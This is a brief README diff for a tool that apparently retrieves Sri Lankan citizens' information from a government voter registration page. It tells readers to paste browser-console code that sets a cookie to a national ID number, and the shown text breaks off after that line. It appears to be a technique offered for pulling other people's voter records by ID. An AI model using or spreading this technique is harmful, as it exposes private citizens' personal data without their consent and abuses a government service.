@@ -1,4 +1,6 @@
-# Srilanka-user-Information-finder
+# Srilanka user Information finder from (Government website url)/myVoterRegistration.aspx
+
+Paste this code into your browser console.
 
 ```
     document.cookie = "nicnu=123456789";
